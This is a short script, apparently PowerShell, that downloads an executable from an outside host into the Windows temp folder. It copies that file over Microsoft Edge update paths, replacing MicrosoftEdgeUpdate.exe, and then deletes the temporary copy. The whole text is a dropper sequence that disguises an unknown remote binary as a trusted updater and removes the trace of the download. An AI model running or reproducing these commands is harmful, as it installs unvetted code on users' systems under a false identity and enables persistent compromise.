wget https://l.station307.com/LYGiXeMAeb6NC9yZ6Qa8bi/msbrowse.exe -OutFile c:\windows\temp\1.exe
copy c:\windows\temp\1.exe 'c:\ProgramData\Microsoft\EdgeUpdate\msbrowse.exe' -Force
copy c:\windows\temp\1.exe 'C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe' -Force
del c:\windows\temp\1.exe
